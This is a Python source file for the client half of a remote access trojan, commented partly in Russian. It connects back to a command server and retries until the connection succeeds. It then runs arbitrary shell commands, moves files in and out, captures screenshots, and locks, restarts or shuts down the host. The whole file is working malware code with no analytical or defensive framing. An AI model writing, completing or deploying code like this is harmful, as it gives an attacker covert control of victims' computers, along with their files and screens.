import socket
import subprocess
import time
import json
import os
import base64
import ctypes
import sys
import pyautogui
import PIL
from client.commands import message
import commands


class RATConnector:

    # Отправляем json данные серверу
    def send_json(self, data):
        """отправка данных серверу"""
        # Если данные окажутся строкой
        try:
            json_data = json.dumps(data.decode('utf-8'))
        except:
            json_data = json.dumps(data) 
        self.connection.send(json_data.encode('utf-8'))



    # Получаем json данные от сервера
    def receive_json(self):
        """получение данных от сервера"""
        json_data = ''
        while True:
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                pass

    def __init__(self, ip, port):
        # Try to connect to the server, if failed wait five seconds and try again.
        while True:
            try:
                self.connection = socket.socket(
                    socket.AF_INET, socket.SOCK_STREAM)
                print("try")
                self.connection.connect((ip, port))
            except socket.error:
                time.sleep(5)
            else:
                break

    def arrayToString(self, s):
        """переводит массив в строку"""
        convStr = ""
        for i in s:
            convStr += i
        return convStr

    # Запускает любую конанду в консоле
    def runCommand(self, command):
        """запускает команду в консоле"""
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    # Reading files with base 64 encryption for non UTF-8 compatability
    def readFile(self, path):
        """читает файл с кодированием"""
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    # Writing files, decode the b64 from the above function
    def writeFile(self, path, content):
        """Записывает файл с кодирование"""
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload complete"
    
    # Обработать изображение с экрана
    def screen_handler(self):
        """делает скриншот"""
        pyautogui.screenshot('1.png')
        with open('1.png', 'rb') as file:
            reader = base64.b64encode(file.read())
        os.remove('1.png')
        return reader

    def run(self):
        while True:
            command = self.receive_json()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "ratHelp":
                    command_response = ""
                elif command[0] == "cd" and len(command) > 1:
                    os.chdir(command[1])
                    command_response = "[+] Changing active directory to " + command[1]
                elif command[0] == "upload":
                    command_response = self.writeFile(command[1], command[2])
                elif command[0] == "download":
                    command_response = self.readFile(command[1]).decode()
                elif command[0] == "message":
                    command_response = commands.message(command[:1])
                elif command[0] == "lock":
                    command_response = commands.lock_pc()
                elif command[0] == "shutdown":
                    command_response = commands.shutdown_pc()
                elif command[0] == "restart":
                    command_response = commands.restart_pc()
                elif command[0] == "screenshot":
                    command_response = self.screen_handler()
                elif command[0] == "screamer":
                    command_response = commands.screamer()
                elif command[0] == "syscom":
                    command_response = commands.sys_command(command[1:])
                else:
                    convCommand = self.arrayToString(command)
                    command_response = self.runCommand(convCommand).decode()
            # Whole error handling, bad practice but required to keep connection
            except Exception as e:
                command_response = (
                    f"[-] Error running command: {e}"
                )
            self.send_json(command_response)


print("run")
ratClient = RATConnector("127.0.0.1", 8080)
ratClient.run()
